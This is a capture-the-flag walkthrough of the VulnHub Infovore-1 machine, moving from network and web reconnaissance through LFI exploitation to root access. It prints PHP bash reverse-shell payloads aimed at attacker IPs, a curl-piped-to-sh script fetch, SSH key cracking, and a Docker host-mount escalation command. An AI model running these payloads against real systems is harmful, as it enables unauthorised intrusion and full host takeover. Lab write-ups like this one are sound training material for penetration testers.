## Introduction
In this write-up, we delve into the penetration testing process of the **Infovore-1** machine from VulnHub. This guide covers each phase of the pentest, from initial reconnaissance to privilege escalation, providing detailed commands, screenshots, and explanations to aid both beginners and intermediate users in understanding the exploitation techniques employed.

## Prerequisites
Before starting the penetration test on Infovore-1, ensure you have the following tools and knowledge:

- **Basic Networking Concepts**: Understanding of IP addressing, subnets, and basic network protocols.
- **Nmap**: Familiarity with network scanning and service enumeration using Nmap.
- **Burp Suite**: Knowledge of intercepting and manipulating HTTP requests.
- **Python Scripting**: Ability to read and understand Python scripts used for exploitation.
- **Understanding of PHP**: Basic knowledge of PHP, especially related to vulnerabilities like Local File Inclusion (LFI) and Remote Code Execution (RCE).
- **Privilege Escalation Techniques**: Familiarity with common privilege escalation methods, including Docker exploitation.

## Summary

**Main Phases of the Pentest**

1. **Reconnaissance and Enumeration**
- Identified the target machine using `arp-scan` and confirmed it was Linux-based by analyzing the TTL value.
- Port scan with `Nmap` revealed a single open port: **80 (HTTP)**.
- The HTTP server was running **Apache 2.4.38** on a **Debian** system with **PHP 7.4.7** support.

2. **Web Resource Exploration**
- Accessed the `/info.php` resource and found that `file_uploads` was enabled.
- Identified technologies such as **Bootstrap**, **jQuery**, and **HTML5** on the web server.

3. **Vulnerabilities Identified**
- **Insecure File Upload:** Allowed arbitrary files to be uploaded without proper validation.
- **Command Injection (LFI to RCE):** Exploited a Local File Inclusion vulnerability to execute malicious commands.
- **Exposed Credentials:** Discovered encrypted SSH keys in a `.oldkeys.tgz` file.
- **Privilege Escalation via Docker:** Used Docker to mount the root filesystem and gain full host access.

4. **Exploitation**
- Uploaded a PHP file containing a reverse shell command to gain remote access.
- Used `wfuzz` for directory fuzzing, uncovering sensitive files, including `/etc/passwd`.
- Decrypted SSH keys using `ssh2john.py` and `John the Ripper`, successfully recovering encrypted credentials.

5. **Privilege Escalation**
- Leveraged Docker to mount the root filesystem (`/`) into a container, gaining full root-level access to the host system.

## Reconnaissance

Step 1: Find the IP of the victim machine

![](/assets/post/infovore1/arp.png)


```bash 
sudo arp-scan -I eth0 --localnet --ignoredups
```


Step 2: Ping the victim machine

If the victim machine has a TTL (Time to Live) value that indicates it is a Linux machine, this typically means that the machine is running a Linux-based operating system.


![](/assets/post/infovore1/ping.png)


Step 3: Reconnaissance Stage
## Nmap 
We proceed with the reconnaissance stage using the following command:
![](/assets/post/infovore1/nmap.png)


```bash 
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.111 -oG allports
```

**Step 4: Detailed Scan of Port 80**

**Command Breakdown:**
1. **`-p-`**: Scans all ports (from 1 to 65535).
2. **`--open`**: Displays only open ports, omitting closed or filtered ports in the result.
3. **`-sS`**: Performs a **SYN scan (Stealth Scan)**, which sends SYN packets to identify open ports without completing the full TCP handshake, making it less detectable.
4. **`--min-rate 5000`**: Sets a minimum rate of 5000 packets per second to speed up the scan.
5. **`-vvv`**: Increases verbosity to the highest level, showing more details in real-time during the scan.
6. **`-n`**: Disables DNS resolution, speeding up the scan by not attempting to resolve domain names.
7. **`-Pn`**: Disables host discovery, treating the host as if it's always "alive."
8. **`192.168.1.111`**: Specifies the target IP address to scan.
9. **`-oG allports`**: Saves the results in a `grepable` format file, named `allports`, which makes it easier to filter and analyze the results with other scripts or commands.

**Scan Results**

1. **Port Discovery**:
    - **Port 80/tcp**: Is **open** and running the **HTTP** service.
    - No other open ports were detected in the full range of ports (65535 ports scanned), indicating that port 80 is the only open and accessible port on this IP address.

2. **Technical Details**:
    - **Port Status**: Port 80/tcp is in an "open" state.
    - **Service**: HTTP (typically used for web servers).
    - **Reason**: `syn-ack ttl 63`, meaning the port responded with a SYN-ACK packet when a SYN was sent, indicating it is open.

**Next Step:**
We will now conduct a more detailed scan focusing on port 80, which is the only open port we found.


![](/assets/post/infovore1/nmap2.png)

```bash
nmap -sCV -p80 192.168.1.111 -oN targeted
```
**Step 5: Detailed Service and Version Scan**

**Command Breakdown:**
- **`-sCV`**: Performs a service and version scan (`-sV`) and runs Nmap scripts (`-sC`) to gather additional information about the services.
- **`-p80`**: Limits the scan to port 80, which is the standard port for HTTP services.
- **`-oN targeted`**: Saves the results in an output file called `targeted` in a human-readable text format.

**Scan Results**

1. **Port 80/tcp Open**:
    - **Service**: HTTP.
    - **Software**: Apache HTTPD version 2.4.38.
    - **Operating System**: The Apache version suggests it is running on **Debian**, which could provide clues about the Linux distribution used by the server.

2. **Additional Service Details**:
    - **Page Title (`_http-title`)**: The HTTP page title is "Include me ...". This may indicate the main page title or refer to a feature or message on the web interface.


## Enumeration
![](/assets/post/infovore1/nmap3.png)

**Step 6: HTTP Resource Enumeration with Nmap**

**Command Breakdown:**
- **`--script http-enum`**: Uses the Nmap `http-enum` script to enumerate common resources and directories on the HTTP server.
- **`-oN webScan`**: Saves the results in an output file called `webScan` in a human-readable text format.

**Scan Results**

1. **Port Detected**:
    - **80/tcp open http**: Port 80 is open and running the HTTP service, indicating that there is an accessible web server.

2. **HTTP Resource Enumeration**:
    - **`/_info.php`**: The script identified a potentially informative file on the server located at `/_info.php`.

**Next Step:**
We will now analyze the technologies used on the web page using WhatWeb.

![](/assets/post/infovore1/whatweb.png)

**Scan Results**

1. **Web Server**:
    - **Apache [2.4.38]**: The identified web server is Apache version 2.4.38.
    - **Operating System**: Additional information indicates that this Apache server is running on **Debian Linux**.

2. **Technologies Detected**:
    - **Bootstrap**: The website uses **Bootstrap**, a CSS and JavaScript library for responsive web design.
    - **HTML5**: The site uses HTML5 for web content markup.
    - **jQuery**: The presence of jQuery suggests the site uses this popular JavaScript library to simplify DOM manipulation and event handling.

3. **PHP Details**:
    - **PHP [7.4.7]**: The server is running PHP version 7.4.7. This could be important as specific versions of PHP may have known vulnerabilities.
    - **X-Powered-By Header**: The `X-Powered-By` header also confirms the server is using PHP 7.4.7.

4. **Web Page Title**:
    - **"Include me ..."**: The page title is "Include me ...". This may provide a clue about the site's functionality or a possible attack vector related to file inclusions.

5. **Status Code**:
    - **200 OK**: The server responded with a 200 status code, indicating that the page loaded successfully.

6. **Location and Country**:
    - **Country [RESERVED] [ZZ]**: The location is shown as "RESERVED," which typically occurs in private network environments where no country is associated with the IP address.

## Vulnerabilities
**Step 7: Web Access**

We accessed the website but did not find anything relevant.
![](/assets/post/infovore1/web.png)


**Step 8: Web Access to `info.php`**

We accessed the website using the `info.php` URL, and within the PHP file found on the site, we discovered that the **`file_uploads`** option is enabled.
![](/assets/post/infovore1/info.png)
## Exploitation
### Burpsuite
**Step 9: File Upload Test with Burp Suite**

We will use **Burp Suite** to attempt uploading a text file named `testing.txt`.


![](/assets/post/infovore1/burp.png)

Step 10:The following changes were made in **Burp Suite** to attempt the file upload:

```bash
Content-Type: multipart/form-data; boundary=--pwnd
----pwnd
Content-Disposition: form-data; name="name"; filename="testing.txt"
Content-Type:text/plain
testing
----pwnd
```

**Step 11: File Upload Vulnerability - LFI**

- **Temporary Path (`tmp_name`)**: `/tmp/phpNzsOt9`, indicating the temporary location where the file is stored on the server.

This suggests that the server is vulnerable to **LFI (Local File Inclusion)**.

**Next Steps:**
We will proceed with the following steps:

![](/assets/post/infovore1/burp2.png)

```bash
Content-Type: multipart/form-data; boundary=--pwnd
----pwnd
Content-Disposition: form-data; name="name"; filename="cmd.php"
Content-Type:text/plain
<?php system ("bash -c 'bash -i >& /dev/tcp/192.168.1.153/443 0>&1 '")?>
----pwnd
```

**Step 12: PHP Reverse Shell Command**

This is a PHP command to execute a reverse shell. It attempts to establish a connection from the target server (`192.168.1.111`) to the IP `192.168.1.153` on port `443`.

**Next Step: Fuzzing with wfuzz**

We will now use **wfuzz** to identify parameters that may allow access to the `/etc/passwd` file.
![](/assets/post/infovore1/wfuzz.png)



```bash 
wfuzz -c --hl=136 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.111/index.php?FUZZ=/etc/passwd
```

## Wfuzz
**Step 13: wfuzz Command Breakdown**

**Command Parameters**:

- `-c`: Displays the output in color.
- `--hl=136`: Filters responses with 136 lines, likely to avoid unwanted results.
- `-t 200`: Sets the number of threads to 200, increasing the speed of requests.
- `-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: Uses a wordlist to try different parameters in the URL.
- `FUZZ`: Indicates the injection point in the URL where the wordlist entries will be tested.



## Post-exploitation

**Next Step: Accessing `/etc/passwd`**

After running the fuzzing tool, we successfully accessed the `/etc/passwd` file, potentially exposing sensitive system information.


![](/assets/post/infovore1/passwd.png)

**Step 14: Using Python Script**

We will use the following Python script obtained from:
https://book.hacktricks.xyz/es/pentesting-web/file-inclusion/lfi2rce-via-phpinfo

This Python script is designed as an exploit for **Local File Inclusion (LFI) with PHPInfo()** vulnerability in a web application.
**Key Components**

1. **Payload Creation**:
    
    - The `setup()` function creates a payload that will write a PHP shell to `/tmp/g` on the server.
    - It sends an HTTP POST request with this payload to a vulnerable `phpinfo.php` page. The payload includes a PHP code that will execute shell commands passed through a `GET` parameter `f`.
2. **LFI Request**:
    
    - After uploading the payload, the script sends a crafted GET request to trigger Local File Inclusion on the vulnerable `lfi.php` page.
    - The GET request tries to include the file created in the previous step (e.g., `/tmp/g`) to execute the PHP shell.
3. **Offset Calculation**:
    
    - The `getOffset()` function determines the position of `[tmp_name]` in the output of `phpinfo()` to locate the file path in the server’s temporary directory.
    - This is used later to include the uploaded file by its temporary name.
4. **Threaded Attack**:
    
    - The script uses threading to speed up the exploitation process.
    - The `ThreadWorker` class handles multiple attempts, trying to include the shell through the LFI exploit.
    - The script stops when the shell is successfully included, providing access to the server.
5. **Usage**:
    
    - The script requires at least the hostname of the target.
    - It has optional arguments for port and the number of threads (defaulting to 80 and 10, respectively).


Key Changes

1. **Reverse Shell Payload**:
    
    - In the `setup()` function, the `PAYLOAD` string was modified. The previous payload wrote a PHP file with a simple command execution. Now, the payload writes a reverse shell command:

```py 
    <?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.93/443 0>&1'");?>
```


**Step 15: Reverse Shell and LFI Injection**

This command establishes a reverse shell connection back to the attacker's machine at IP `192.168.1.93` on port `443`, giving the attacker remote access to the compromised system.

**Modified Target File and Path**:

- The path in the POST request was changed from `phpinfo.php` to `info.php`. This indicates the target file on the server has been updated, possibly due to differences in the target environment.
- The LFI request now targets `index.php` with a query parameter `filename`, suggesting a different LFI vulnerability path or parameterization.
  
**Updated LFI Injection String**:
- The LFI URL structure in `LFIREQ` now uses `%s` with the `filename` parameter, which may be specific to the target application.

**Escape Characters for HTML**:
- The search term for `[tmp_name] =>` was updated to handle HTML entity encoding as `[tmp_name] =&gt;`, which is common in PHPInfo output displayed in HTML. This change helps locate the temporary file path in cases where the output is HTML-encoded.

**Next Step: Running the Script**

We will now execute the script to exploit the identified vulnerabilities and gain remote access.
![](/assets/post/infovore1/php.png)


**Step 16: Accessing the Victim Machine via LFI**

We now have access to the victim machine using **LFI (Local File Inclusion)**. This allows us to explore the system further and potentially escalate privileges or perform additional actions.

Next, we will continue to investigate the machine's environment and gather more information for further exploitation.

![](/assets/post/infovore1/lfi.png)
**Step 17: Using a GitHub Repository for OSCP Reconnaissance**

We will use a GitHub repository that can be used in the OSCP, which only applies reconnaissance within the system.

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
**Step 18: Finding the `.oldkeys.tgz` File**

The repository helps us find the `.oldkeys.tgz` file on the system.


```bash 
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Step 19: Finding an Encrypted Key**

We found an encrypted key on the system.
![](/assets/post/infovore1/o.png)


**Step 20: Cracking the Encrypted Key with `ssh2john.py`**

We can break or crack the encrypted key using the `ssh2john.py` script.
![](/assets/post/infovore1/john.png)



**Step 21: Hash Provided for Brute Force**

The script provides us with the hash, allowing us to apply brute force. We will proceed using **John the Ripper** (`john`).

![](/assets/post/infovore1/john2.png)

**Step 22: Found the Password**

We found the password: **choclate93**.

**Step 23: Migrating to the Root User**

We migrated to the root user using the password we found: **choclate93**.
![](/assets/post/infovore1/root.png)

## First Flag
**Step 24: Found the First Flag**

We found the first flag.

![](/assets/post/infovore1/flag1.png)
```bash
FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it} And onwards and upwards!
```


![](/assets/post/infovore1/ssh.png)

**Step 25: Found SSH Public Keys**

We found SSH public keys, and the root user can authenticate without a password as the admin user to the victim machine's IP address.


## Second flag
**Step 26: Found Another Flag**

We found another flag.
![](/assets/post/infovore1/flag2.png)


```bash 
`FLAG{Escaped_from_D0ck3r}
```

## Privilege Escalation Using Docker
**Step 27: Creating a Docker Image for Privilege Escalation**

We created a Docker image for privilege escalation by reusing an image that had already been created.

```bash 
docker run -dit -v /:/mnt/root --name priv theart42/infovore
```

**Step 28: Privilege Escalation Using Docker**

This command can be used as a privilege escalation technique on systems that allow a user to execute Docker commands without root restrictions. Privilege escalation occurs because the root file system of the host (`/`) is mounted in the Docker container, giving the user full access to the host's system files from within the container.

**Command Breakdown**:

- **`-v /:/mnt/root`**: Mounts the root directory (`/`) of the host system into the container at the path `/mnt/root`.
- **`-dit`**: Runs the container in **detached** mode (in the background) and interactive, assigning a terminal.
- **`-v /:/`**: Mounts the root directory `/` of the host system into the container, giving full access to the host system from inside the container.
- **`--name priv`**: Assigns the name `priv` to the container for easier identification.
- **`theart42/infovore`**: Specifies the image to use for the container.

**Access to Root System Files**:

- By mounting `/` to `/mnt/root`, the user inside the container has access to all files and directories of the host system. This includes critical configuration files and private keys that are typically restricted to root users.
## Final flag
We found the final flag on the machine.
